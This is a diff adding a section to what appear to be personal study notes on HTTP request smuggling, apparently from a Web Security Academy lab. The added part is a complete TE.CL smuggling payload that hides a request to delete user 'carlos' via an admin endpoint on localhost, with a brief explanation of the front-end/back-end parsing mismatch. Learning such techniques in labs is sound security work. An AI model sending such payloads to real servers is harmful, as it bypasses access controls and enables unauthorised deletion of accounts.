@@ -236,7 +236,28 @@ x=
 0
 
 /7c char
-````
+```
+
+##TE.CL exploit
+
+```
+POST / HTTP/1.1
+Host: 0a1a006d046843578261b5ba008700a5.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+88
+POST /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+
+x=x
+0
+
+
+```
 Front-end server support Transfer-Encoding header, backend support only Content-Length. Front pass all as 1 request, backend split into two and read second one as new request. And next request passed to server will be added to this, and will arise error as here:
 ```
 GET /404 HTTP/1.1
